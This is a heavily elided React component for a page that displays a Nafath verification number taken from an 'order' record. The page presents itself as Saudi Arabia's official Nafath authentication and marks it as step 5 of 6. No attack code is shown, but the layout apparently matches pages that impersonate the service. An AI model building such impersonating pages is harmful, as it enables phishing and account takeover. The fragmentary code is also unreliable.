...
export default function ModernNafatOtp() {
  const router = useRouter();
    ...
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-slate-900 to-teal-950">
      ...
      <div className="relative overflow-hidden bg-gradient-to-r from-teal-900/20 to-cyan-900/20 border-b border-slate-800">
        ...
        <div className="relative max-w-7xl mx-auto px-4 py-16 text-center">
          ...
          <p className="text-gray-300 text-lg max-w-2xl mx-auto">
            Secure authentication using the Nafath mobile application
          </p>
        </div>
      </div>
      ...
      <div className="max-w-3xl mx-auto px-4 py-16">
        ...
        <div className="bg-slate-900/50 backdrop-blur-xl rounded-3xl p-8 md:p-12 border border-slate-800">
              ...
              <div className="relative group">
                ...
                >
                  ...
                  <div className="flex items-center gap-2">
                    ...
                    <p className="text-2xl font-bold">{order.nafatOtpOne}</p>
                  </div>
                </div>
              </div>
            ) : (
          ...
          {/* Continue Button */}
          <button
            onClick={order.nafatOtpOne ? handleSubmit : reload}
            disabled={!order.nafatOtpOne}
          ...
          <div className="mt-6 p-4 bg-slate-800/30 rounded-xl border border-slate-700">
            <p className="text-sm text-gray-400 flex items-start gap-2">
              ...
              <span>
                ...
                {`This
                verification is conducted through Saudi Arabia's official Nafath
        ...
        {/* <div className="mt-12 max-w-xl mx-auto">
          <div className="flex items-center justify-between mb-4">
            <span className="text-sm text-gray-400">Step 5 of 6</span>
